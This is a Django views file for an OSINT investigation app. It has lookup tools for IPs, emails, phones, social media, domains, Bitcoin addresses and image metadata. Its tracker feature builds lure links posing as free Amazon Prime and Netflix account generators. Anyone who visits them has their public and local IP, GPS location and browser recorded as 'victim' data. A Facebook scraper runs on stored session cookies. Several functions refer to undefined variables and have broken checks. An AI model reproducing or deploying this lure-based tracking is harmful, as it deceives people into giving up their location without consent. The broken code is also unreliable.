from django.shortcuts import render, redirect
from django.views.decorators.csrf import csrf_exempt
from django.contrib.sessions.models import Session
from django.core.exceptions import PermissionDenied
from django.contrib import messages
from django.contrib.auth import update_session_auth_hash
from django.contrib.auth.models import User, auth
from django.contrib.auth.forms import PasswordChangeForm
from django.template.loader import get_template, render_to_string
from django.http import JsonResponse, HttpResponse, HttpResponseRedirect

from .modules.social.social import Social
from .modules.email.email import Email
from .modules.ip.ip import Ipaddress
from .modules.phone.phone import Phone
from .modules.domain.webosint import getDomain
from .modules.ip.maclookup import macLookup

from .modules.image.reverseimg import reverseImg
from .modules.image.metadata import get_exif
from .modules.ip.multipleip import read_multiple_ip
from .modules.ip.ipstack import IPtrace
from .modules.social.locmap import loc, heat_map, gps_map

from .modules.btc.btc import btcaddress
from .modules.cluster import MakeCluster
from .modules.social.fbkeyword import FacebookScrapper
from .modules.vechile.license import vechileno

from weasyprint import HTML
import sys, os, requests, re, time,base64, json
import pdfx, pdfkit, urllib.parse, urllib3, tempfile
from io import BufferedReader, BytesIO
from datetime import datetime, timezone
from xhtml2pdf import pisa
from pyvirtualdisplay import Display

from dateutil import tz

sys.path.append("../src")
BASE_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))

@csrf_exempt
def index(request):
  if request.method == 'GET':

    username = request.user.username
    user = User.objects.filter(username=username).first()

    try:
      history_json = open("media/json/history_{}.json".format(username),"r")
      history = json.loads(history_json.read())
      history_json.close()

    except FileNotFoundError:
      history_json = open("media/json/history_{}.json".format(username),"w")
      history = json.loads(open("templates/json/history.json").read())
      history_json.write(json.dumps(history, indent = 4))
      history_json.close()
    
    print(history['Search_query'])
    
    return render(request, 'index.html', {'search_query':history['Search_query']})

  if request.method == 'POST':

    username = request.user.username
    user = User.objects.filter(username=username).first()

    ipstackkey = user.profile.ipstackkey
    macapikey = user.profile.macapikey
    apilayerphone = user.profile.apilayerphone
    hlruname = user.profile.hlruname
    hlrpwd = user.profile.hlrpwd
    hibpkey = user.profile.hibpkey
    hunterkey = user.profile.hunterkey
    googlemapapikey = user.profile.googlemapapikey
    shodankey = user.profile.shodankey
    emailrepkey = user.profile.emailrepkey
    c_user = user.profile.c_user
    xs = user.profile.xs

    try:
      history_json = open("media/json/history_{}.json".format(username),"r")
      history = json.loads(history_json.read())
      history_json.close()

    except FileNotFoundError:
      history_json = open("media/json/history_{}.json".format(username),"w")
      history = json.loads(open("templates/json/history.json").read())
      history_json.write(json.dumps(history, indent = 4))
      history_json.close()

    query = str(request.POST['query'].replace(" ", ""))
    query = query.split(":", 1)

    request_type = str(query[0])
    request_data = str(query[1])

    starttime = datetime.now().astimezone(tz.gettz('ITC')).strftime('%H:%M') # Scan start time

    search_query = [request_type,request_data,starttime]

    history["query_type"][request_type]+=1 # Increasing the scanned query count
    history["notifications"].insert(0,"{} started at {}".format(request_type,starttime))
    history["Search_query"].insert(0,{"query":search_query})


    history_json = open("media/json/history_{}.json".format(username),"w")
    history_json.write(json.dumps(history, indent = 4)) # Writing the notifcation and query count, search type and query to json
    #history_json.close()

    searchfile = open("media/json/data.json","w") # Opening the centralized json that stores all the query result


    if request_type == 'social':

      social = Social(request, request_type, request_data)
      endtime = datetime.now().astimezone(tz.gettz('ITC')).strftime('%H:%M %d %b') # Scan End Time
      history["notifications"].insert(0,"{} ended at {}".format(request_type,endtime))
      history_json.write(json.dumps(history, indent = 4))
      history_json.close()

      if googlemapapikey != "":
        if len(social['location'])>0:
          gmap3=loc(location, googlemapapikey)
        else:
          gmap3=None
        
        return render(request, 'social.html',{'social':social,'gmap3':gmap3})
      else:
        return render(request, 'index.html', {'Error': 'Missing Google Map API Key'})

    elif request_type == 'ip':

      if ipstackkey and shodankey and googlemapapikey != "":
        ip = Ipaddress(request_data, ipstackkey, shodankey)
      
      else:
        return render(request, 'index.html', {'Error':'IPstack / Shodan / GoogleMaps API key missing'})

      lats = ip['ipstackdata']['latitude']
      lons = ip['ipstackdata']['longitude']
      ip['gmap3'] = heat_map([lats], [lons], googlemapapikey)

      return render(request, 'results.html', {'ip': ip})

    elif request_type == 'victimtrack':

        request_data = request_data.split(',')
        pubip = request_data[0]

        ip = {}

        if googlemapapikey or ipstackkey == "":
          return render(request, 'index.html', {'Error': 'Googlemap / IPstack API key missing'})
        
        if request_data[1].replace('.', '', 1).isdigit() and request_data[2].replace('.', '',1).isdigit():
          lat = float(request_data[1])
          lon = float(request_data[2])
          ip['gpsmap'] = gps_map([lat], [lon], googlemapapikey)  # GPS Latitude and Longitude

        ip = IPtrace(pubip, ipstackkey)
        iplats = ip['ipstackdata']['latitude'] # IP latitude and Longitudes
        iplons = ip['ipstackdata']['longitude']

        return render(request, 'results.html', {'ip': ip, 'iplats': iplats, 'iplons': iplons})

    elif request_type == 'phone':

      phone = Phone(request_data, apilayerphone, hlruname, hlrpwd)
      return render(request, 'results.html', {'phone':phone})

    elif request_type == 'mac':
      
      if macapikey == "":
        return render(request, 'index.html', {'Error': 'Missing Ip MacVender API Key'})

      macdata = macLookup(request_data, macapikey)
      
      if 'Error' in macdata.keys():
          return render(request, 'results.html', {'Error': macdata['Error']})
      else:
          return render(request, 'results.html', {'macdata': macdata})
          

    elif request_type == 'email':
      email = Email(request_data, hibpkey, hunterkey, emailrepkey)
      return render(request, 'results.html', {'email':email})

    elif request_type == 'domain':
      return domain(request, request_data)

    elif request_type == 'cluster':
      jsonurl = MakeCluster(request, request_data.split(","))
      return render(request, 'cluster.html', {'url': jsonurl})

    elif request_type == 'btc':

      btc = btcaddress(request_data)

      return render(request, 'results.html', {'btc': btc})

    elif request_type == 'vehicle':

      vechileinfo = vechileno(request_data)

      return render(request, 'results.html', {'vechileinfo': vechileinfo})

    elif request_type == 'fbsearch':
      keyword = str(request.POST['query'].split(":")[-1])
      fbsearch = FacebookScrapper(keyword, c_user, xs)
      return render(request, 'results.html', {'fbsearch': fbsearch})

def reports(request):
  username = request.user.username

  # print(history)
  if len(history["Search_query"]) == 0:
      return render(request, "reports.html")
  return render(request, "reports.html", {"search_query": history["Search_query"]})


def domain(request, request_data):
  username = request.user.username
  query = ["domain", request_data]

  request_type = "domain"
  if request_data in data[request_type].keys():
      webosint = data[request_type][request_data]["webosint"]
      portscan = data[request_type][request_data]["portscan"]
  else:
      portscan = DefaultPort(request_data)
      webosint = getDomain(request_data)
      data[request_type][request_data] = {"webosint": webosint, 'portscan': portscan}
  
  return render(request, 'domain.html', {"webosint": webosint, 'portscan': portscan})


def reverseimage(request):
  if request.method == "GET":
    return render(request, 'apps/reverseimage.html')

  elif request.method == "POST":

    url = reverseImg(str(request.FILES['input-b2']), request.FILES['input-b2'].file)
    if "https" in url:
        return redirect(url)
    else:
        return render(request, 'apps/reverseimage.html', {"Error": url})


def metadata(request):
  username = request.user.username
  user = User.objects.filter(username=username).first()
  googlemapapikey = user.profile.googlemapapikey

  if request.method == "GET":

    return render(request, 'apps/metadata.html', {"GET": 'get'})

  elif request.method == "POST":
  
    filename=str(request.FILES['metaimage']).split('.',1)
      
    if filename[-1] in ['jpg','png','gif','tif','jpeg']:
      
      metadata = get_exif(request.FILES['metaimage'])
      
      if 'Error' in metadata.keys():
        return render(request, 'apps/metadata.html',{'metadata':metadata, "POST":"post"})

      elif 'Latitude' in metadata.keys():
        
        lats = metadata['Latitude']
        lons = metadata['Longitude']
        gmap3=heat_map([lats],[lons], googlemapapikey)
        return render(request, 'apps/metadata.html',{'metadata':metadata, 'gmap3':gmap3, "POST":"post"})

      else:
        return render(request, 'apps/metadata.html',{'metadata':metadata, "POST":"post"})

    elif filename[-1] == 'pdf':
      user.profile.metaimage = request.FILES['metaimage']
      user.profile.save()
      metadata=pdfx.PDFx(BASE_DIR + user.profile.metaimage.url).get_metadata()
      os.remove(BASE_DIR + user.profile.metaimage.url)
      metadata['references_dict'] = pdf.get_references_as_dict()
      return render(request, 'apps/metadata.html',{'metadata':metadata, "POST":"post"})

    else:
      return render(request, 'apps/metadata.html',{"Error":"Upload a filename with Valid Extension"})
          


def heatmap(request):
  username = request.user.username
  user = User.objects.filter(username=username).first()
  if request.method == "GET":
    return render(request, "apps/ipheatmap.html")
  elif request.method == "POST":
    if 'input-b1' in request.FILES.keys() and request.FILES['input-b1'] != "":
        ipstackkey = user.profile.ipstackkey
        gmap3 = read_multiple_ip(request.FILES['input-b1'].file, ipstackkey)
        return render(request, 'results.html', {'gmap3': gmap3})
    else:
        return render(request, "apps/ipheatmap.html")


def documentation(request):
  if request.method == "GET":
      try:
          page = request.GET['page']
          if page == "start":
              return render(request, 'doc/start.html')
          elif page == "elements":
              return render(request, 'doc/elements.html')
          elif page == "license":
              return render(request, 'doc/license.html')
          elif page == "tracker":
              return render(request, 'doc/trackerinfo.html')
          elif page == "faq":
              return render(request, 'doc/faq.html')
          elif page == "credits":
              return render(request, 'doc/credits.html')
          else:
              pass
      except:
          pass
  return render(request, 'doc/documentation.html')


def settings(request):

  if request.method == 'GET':

    return render(request, 'settings.html')

  if request.method == 'POST':

    username = request.user.username
    user = User.objects.filter(username=username).first()

    if "exportjson" in request.POST.keys():
      attr = list(request.POST.keys())
      jsonexport = "{"

      for keys in attr[5:]:
          jsonexport += "\"" + keys + "\"" + ":" + "\"" + request.POST[keys].encode().decode('utf-8') + "\"" + ","
      jsonexport += "}"
      filename = str(user) + '_exportkeys.json'
      response = HttpResponse(jsonexport, content_type='application/json')
      response['Content-Length'] = len(response.content)
      response['Content-Disposition'] = 'attachment; filename=' + str(filename)
      return response

    elif "importjson" in request.FILES.keys():

      file = str(request.FILES['importjson']).split(".")
      if len(file) == 2 and file[-1] == "json":

        with BufferedReader(request.FILES['importjson']) as f:
          jsoncontent = f.read().decode("utf-8").replace(",}", "}")
        jsoncontent = json.loads(jsoncontent)

        for keys in jsoncontent.keys():

          attr = list(request.POST.keys())
          if keys not in attr[3:]:
            return render(request, 'settings.html', {"Error": "File with Unknown Key"})

        for keys in attr[3:]:	
          user.profile.keys = jsoncontent[keys]

        user.profile.save()
        return render(request, 'settings.html')
      else:
          return render(request, 'settings.html', {"Error": "Unknown File format"})

    if request.POST['hibpkey'] != '':
      user.profile.hibpkey = request.POST['hibpkey']
    
    if request.POST['hunterkey']!= '':
      user.profile.hunterkey = request.POST['hunterkey']

    if request.POST['apilayerphone'] != '':
      user.profile.apilayerphone = request.POST['apilayerphone']

    if request.POST['hlruname'] != '':
      user.profile.hlruname = request.POST['hlruname']

    if request.POST['hlrpwd'] != '':
        user.profile.hlrpwd = request.POST['hlrpwd']

    if request.POST['googlemapapikey'] != '':
      user.profile.googlemapapikey = request.POST['googlemapapikey']

    if request.POST['macapikey'] != '':
      user.profile.macapikey = request.POST['macapikey']

    if request.POST['ipstackkey'] != '':
      user.profile.ipstackkey = request.POST['ipstackkey']

    if request.POST['virustotalkey'] != '':
      user.profile.virustotalkey = request.POST['virustotalkey']
      
    if request.POST['shodankey'] != '':
      user.profile.shodankey = request.POST['shodankey']
      
    if request.POST['emailrepkey'] != '':
      user.profile.emailrepkey = request.POST['emailrepkey']
      
    if request.POST['c_user'] != '':
      user.profile.c_user = request.POST['c_user']

    if request.POST['xs'] != '':
      user.profile.xs = request.POST['xs']

    user.profile.save()
    return render(request, 'settings.html')


@csrf_exempt
def receivetrack(request, template, username):
  secret = str(str(request.META['PATH_INFO']).split('/')[-1]).replace('a', '=')
  secret = base64.b64decode(secret)
  secret = secret.decode('ascii')
  secret = "".join(
      ["0123456789abcdefghijklmnopqrstuvwxyz"[("0123456789abcdefghijklmnopqrstuvwxyz".find(c) + 23) % 36] for c in
        secret])

  if request.method == 'GET':
      return render(request, request.META['PATH_INFO'].split('/')[1] + '.html')

  elif request.method == 'POST':
      localip = str(request.POST.get('locip'))
      viclatitude = str(request.POST.get('latitude'))
      viclongitude = str(request.POST.get('longitude'))

      vicuseragent = str(request.user_agent.browser.family)

      publicip = str(request.META.get('HTTP_X_REAL_IP'))

      user = User.objects.filter(username=secret).first()

      if user.profile.victimpublicip == '':  # Assigning values for the first time
          user.profile.victimpublicip = publicip
          user.profile.victimlocip = localip
          user.profile.victimlatitude = viclatitude
          user.profile.victimlongitude = viclongitude
          user.profile.victimuseragent = vicuseragent

      user.profile.victimpublicip += ',' + publicip  # Appending values from 2nd time
      user.profile.victimlocip += ',' + localip
      user.profile.victimlatitude += ',' + viclatitude
      user.profile.victimlongitude += ',' + viclongitude
      user.profile.victimuseragent += ',' + vicuseragent

      user.profile.save()
      return render(request, request.META['PATH_INFO'].split('/')[1] + '.html')


def tracker(request):
  if request.method == 'GET':

    username = request.user.username
    user = User.objects.filter(username=username).first()

    secret = "".join(
        ["0123456789abcdefghijklmnopqrstuvwxyz"[("0123456789abcdefghijklmnopqrstuvwxyz".find(c) + 13) % 36] for c in
          str(username)])
    secret = base64.b64encode(str(secret).encode('ascii'))
    if "=" in str(secret.decode('ascii')):
      secret = str(secret.decode('ascii')).replace('=', 'a')
    try:
      secret = secret.decode('ascii')
    except:
      pass
    url = {}

    url['1'] = "https://osint.studio/amazonprimegenerator/" + str(secret)

    url['2'] = "https://osint.studio/netflixaccountgenerator/" + str(secret)

    # Fetching values from DB as list

    victimpublicip = user.profile.victimpublicip.split(",")

    victimlocip = user.profile.victimlocip.split(",")

    viclatitude = user.profile.victimlatitude.split(",")

    viclongitude = user.profile.victimlongitude.split(",")

    vicuseragent = user.profile.victimuseragent.split(",")

    victim = []
    for i in range(len(viclatitude)):
      victim.append([victimpublicip[i], victimlocip[i], vicuseragent[i], viclatitude[i], viclongitude[i]])

    if victimpublicip != ['']:
      return render(request, 'apps/tracker.html', {'victim': victim, 'url': url})
    else:
      return render(request, 'apps/tracker.html', {'url': url})

  if request.method == 'POST':
    username = request.user.username
    user = User.objects.filter(username=username).first()
    if "flush" in request.POST.keys():
      user.profile.victimlatitude = ""
      user.profile.victimlocip = ""
      user.profile.victimpublicip = ""
      user.profile.victimlongitude = ""
      user.profile.victimuseragent = ""
      user.save()
      return redirect("apps/tracker")
    else:
      return redirect('apps/tracker')


def change_password(request):
  if request.method == 'POST':
      form = PasswordChangeForm(request.user, request.POST)
      if form.is_valid():
        user = form.save()
        update_session_auth_hash(request, user)  # Important!
        messages.success(request, 'Your password was successfully updated!')
        return redirect('change_password')
      else:
        messages.error(request, 'Please correct the error below.')
  else:
    form = PasswordChangeForm(request.user)
  return render(request, 'change_password.html', {'form': form})


def logout(request):
  auth.logout(request)
  return HttpResponseRedirect("login")


def login(request):
  if request.method == 'GET':
    return render(request, 'login.html')

  if request.method == 'POST':

    text = request.POST['policeid']

    password = request.POST['password']

    user = auth.authenticate(username=text, password=password)

    if user is not None:
      auth.login(request, user)
      return redirect('index')
    else:
      return render(request, 'login.html', {'Auth': 'False'})


def media(request, username):
  # print(request.COOKIES['sessionid'])
  session = Session.objects.get(session_key=request.COOKIES['sessionid'])
  uid = session.get_decoded().get('_auth_user_id')
  user = User.objects.get(pk=uid)
  if user.username == re.findall("/media/json/(.*).json", request.META['PATH_INFO'])[0]:
    with open("media/json/{}.json".format(user.username)) as data:
      jsondata = json.load(data)
      # print(jsondata)
      data.close()
      return JsonResponse(jsondata, safe=False)
  else:
    return forbidden(request, PermissionDenied())


def bad_request_error(request, exception):
  return render(request, 'Error400.html', status=400)


def forbidden(request, exception):
  return render(request, 'Error403.html', status=403)


def page_not_found(request, exception):
  return render(request, 'Error404.html', status=404)


def server_error(request):
  return render(request, 'Error500.html', status=500)
